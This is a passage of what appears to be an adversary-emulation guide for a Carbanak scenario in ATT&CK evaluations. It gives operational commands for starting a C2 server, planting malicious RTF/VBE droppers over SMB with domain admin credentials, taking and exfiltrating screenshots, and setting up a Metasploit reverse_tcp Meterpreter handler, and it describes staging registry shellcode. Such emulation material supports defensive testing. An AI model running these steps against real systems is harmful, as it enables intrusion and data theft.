viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) and writes the screenshot to disk. The attacker then downloads the resulting screenshot over the existing C2 channel (<a href="https://attack.mitre.org/techniques/T1041/" class="outbound" target="_blank"><span>T1041</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>This step consists of behaviors found in Steps 0, 1, and 2 of Scenario 1.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="1a---start-c2-server">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#1a---start-c2-server">#</doc-anchor-trigger>
        <span>1.A - Start C2 Server</span>
    </h4>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Start a new <code v-pre>tmux</code> session</p>
<p><code v-pre>tmux</code></p>
</li>
<li><p>Start the C2 Server</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd carbanak/Resources/utilities/carbanak_c2server/c2server
sudo ./c2server.elf -lhost 0.0.0.0:443 -ssl</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="1b---user-execution-malicious-file-using-microsoft-word-t1204002">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#1b---user-execution-malicious-file-using-microsoft-word-t1204002">#</doc-anchor-trigger>
        <span>1.B - User Execution: Malicious File (using Microsoft Word) (<a href="https://attack.mitre.org/techniques/T1204/002/" class="outbound" target="_blank"><span>T1204.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>If testing with Microsoft Word, perform the following. If not, perform <doc-anchor-trigger to="#1b---user-execution-malicious-file-without-using-microsoft-word">Step 1.B*</doc-anchor-trigger> instead.</p>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Open a new <code v-pre>tmux</code> terminal</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl+b c</code></pre>
</doc-codeblock></div>
</li>
<li><p>Copy <code v-pre>1-list.rtf</code> to <code v-pre>&lt;domain_admin&gt;</code>&#x27;s Desktop on <code v-pre>hrmanager</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;hrmanager_ip&gt;/C$ -c &quot;put carbanak/Resources/step1/1-list.rtf Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\Desktop\\1-list.rtf&quot;</code></pre>
</doc-codeblock></div>
<p>Provide <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
</ol>
<p>On <code v-pre>hrmanager</code>:</p>
<ol>
<li><p>Login to victim workstation as <code v-pre>&lt;domain_admin&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">xfreerdp +clipboard /u:&quot;&lt;domain_admin&gt;@&lt;domain_full&gt;&quot; /p:&quot;&lt;domain_admin_password&gt;&quot; /v:&lt;hrmanager_ip&gt;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Double-click <code v-pre>1-list.rtf</code> located on <code v-pre>&lt;domain_admin&gt;</code>&#x27;s desktop</p>
</li>
<li><p>Decline any spurious prompts, including updating document with linked data</p>
</li>
<li><p>Double click the <strong>text</strong> that says &quot;Double Click Here To Unlock&quot;</p>
</li>
<li><p>When prompted to run a script, click &#x27;open&#x27;</p>
</li>
<li><p>Click &quot;ok&quot; when the fake error message displays</p>
</li>
</ol>
<p>You should receive a callback on the C2 server.</p>
<doc-anchor-target id="1b---user-execution-malicious-file-without-using-microsoft-word">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#1b---user-execution-malicious-file-without-using-microsoft-word">#</doc-anchor-trigger>
        <span>1.B* - User Execution: Malicious File (without using Microsoft Word)</span>
    </h4>
</doc-anchor-target>
<p>Perform the following on <code v-pre>hrmanager</code> if you&#x27;re testing without Office licenses:</p>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Open a new <code v-pre>tmux</code> terminal</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl+b c</code></pre>
</doc-codeblock></div>
</li>
<li><p>Copy <code v-pre>drop_payloads.vbe</code> to <code v-pre>hrmanager</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;hrmanager_ip&gt;/C$ -c &quot;put carbanak/Resources/step1/drop-payloads.vbe Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\Desktop\\drop-payloads.vbe&quot;</code></pre>
</doc-codeblock></div>
<p>Provide <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted:</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
</ol>
<p>On hrmanager:</p>
<ol>
<li><p>Login to victim workstation as <code v-pre>&lt;domain_admin&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">xfreerdp +clipboard /u:&quot;&lt;domain_admin&gt;@&lt;domain_full&gt;&quot; /p:&quot;&lt;domain_admin_password&gt;&quot; /v:&lt;hrmanager_ip&gt;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open cmd.exe</p>
</li>
<li><p>Manually execute VB script</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">[hrmanager CMD]&gt; cscript.exe C:\Users\&lt;domain_admin&gt;.&lt;domain&gt;\Desktop\drop-payloads.vbe</code></pre>
</doc-codeblock></div>
</li>
<li><p>Make sure you click the &#x27;ok&#x27; on the error message box! If you don&#x27;t, the payload won&#x27;t execute!</p>
</li>
</ol>
<doc-anchor-target id="1c---local-discovery-t1033-t1082-t1057">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#1c---local-discovery-t1033-t1082-t1057">#</doc-anchor-trigger>
        <span>1.C - Local Discovery (<a href="https://attack.mitre.org/techniques/T1033/" class="outbound" target="_blank"><span>T1033</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1082/" class="outbound" target="_blank"><span>T1082</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1057/" class="outbound" target="_blank"><span>T1057</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Switch back to the Carbanak C2 server <code v-pre>tmux</code> window</p>
</li>
<li><p>Get system information</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; enum-system</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="1d---screen-capture-t1113">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#1d---screen-capture-t1113">#</doc-anchor-trigger>
        <span>1.D - Screen Capture (<a href="https://attack.mitre.org/techniques/T1113/" class="outbound" target="_blank"><span>T1113</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li><p>Upload screenshot script</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; upload-file /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step2/take-screenshot.ps1 &quot;C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Take Screenshot</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; exec-cmd &quot;powershell.exe C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exfil screenshot file over existing C2 channel</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; download-file &quot;C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.png&quot; /tmp/screenshot__.png</code></pre>
</doc-codeblock></div>
</li>
<li><p>Switch to the other <code v-pre>tmux</code> terminal</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Ctrl-b + n</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify &quot;screenshot__.png&quot; download worked</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">&lt;attacker&gt;@&lt;attack_platform&gt;&gt;:~$ ls /tmp/</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit <code v-pre>tmux</code> Window</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Kill current session from C2 server</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; exec-cmd taskkill /F /IM wscript.exe</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit C2 Server</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(ATT&amp;CK Evals)&gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close <code v-pre>tmux</code> session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">tmux kill-session</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close <code v-pre>hrmanager</code> RDP session</p>
</li>
</ol>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Carbanak has created DOCX and RTF files with malicious files embedded in the documents. The user will click on an image which drops a VBS and builds a JScript RAT<sup><a href="https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control" class="outbound" target="_blank"><span>13</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
</ul>
<hr>
<doc-anchor-target id="test-2-registry-shellcode-and-execution">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#test-2-registry-shellcode-and-execution">#</doc-anchor-trigger>
        <span>Test 2: Registry Shellcode and Execution</span>
    </h2>
</doc-anchor-target>
<p>The attacker prepares and deploys a second stage RAT on the victim. First, they write obfuscated (<a href="https://attack.mitre.org/techniques/T1027/" class="outbound" target="_blank"><span>T1027</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) shellcode to the Windows Registry using <code v-pre>reg.exe</code> (<a href="https://attack.mitre.org/techniques/T1112/" class="outbound" target="_blank"><span>T1112</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>The attacker then executes a PowerShell blob (<a href="https://attack.mitre.org/techniques/T1059/001/" class="outbound" target="_blank"><span>T1059.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) that reads the shellcode from the registry (<a href="https://attack.mitre.org/techniques/T1012/" class="outbound" target="_blank"><span>T1012</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), decodes and decrypts it (<a href="https://attack.mitre.org/techniques/T1140/" class="outbound" target="_blank"><span>T1140</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), and then finally injects the shellcode into the current PowerShell process, executing it via a call to CreateThread (<a href="https://attack.mitre.org/techniques/T1055/" class="outbound" target="_blank"><span>T1055</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). After execution, the attacker receives a callback over TCP port 8080 (<a href="https://attack.mitre.org/techniques/T1571/" class="outbound" target="_blank"><span>T1571</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>With this new 2<sup>nd</sup> stage RAT, the attacker examines local files in <code v-pre>&lt;domain_admin&gt;</code>&#x27;s home directory (<a href="https://attack.mitre.org/techniques/T1083/" class="outbound" target="_blank"><span>T1083</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). The attacker then calls the <code v-pre>Get-NetComputer</code> function from the PowerView library, which queries Active Directory objects to return a list of hostnames in the current domain (<a href="https://attack.mitre.org/techniques/T1018/" class="outbound" target="_blank"><span>T1018</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). The attacker then executes <code v-pre>Find-LocalAdminAccess</code>, also from PowerView, to confirm that the attacker has administrator access on the current workstation (<a href="https://attack.mitre.org/techniques/T1069/" class="outbound" target="_blank"><span>T1069</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>This step consists of behaviors found in Steps 3 and 4 of Scenario 1.</p>
<doc-anchor-target id="procedures-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-1">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="2a---start-c2-handler">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#2a---start-c2-handler">#</doc-anchor-trigger>
        <span>2.A - Start C2 Handler</span>
    </h4>
</doc-anchor-target>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Start Metasploit</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo msfconsole</code></pre>
</doc-codeblock></div>
</li>
<li><p>Set up TCP listener for Meterpreter on TCP port 8080</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport 8080
set lhost 192.168.0.4
set ExitOnSession False
exploit -j</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="2b---stage-2nd-stage-rat-t1112">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#2b---stage-2nd-stage-rat-t1112">#</doc-anchor-trigger>
        <span>2.B - Stage 2<sup>nd</sup> stage RAT (<a href="https://attack.mitre.org/techniques/T1112/" class="outbound" target="_blank"><span>T1112</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>On <code v-pre>hrmanager</code>:</p>
<ol>
<li><p>Login to victim workstation as <code v-pre>&lt;domain_admin&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">xfreerdp +clipboard /u:&quot;&lt;domain_admin&gt;@&lt;domain_full&gt;&quot; /p:&quot;&lt;domain_admin_password&gt;&quot; /v:&lt;hrmanager_ip&gt;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Open Administrative PowerShell</p>
</li>
<li><p>Write shellode to Registry</p>
<p>Note that the shellcode is:</p>
<ul>
<li>encrypted: XOR with key &#x27;xyz&#x27;</li>
<li>compressed: Gzip</li>
<li>encoded: base64</li>
<li>designed to connect back to 192.168.0.4</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
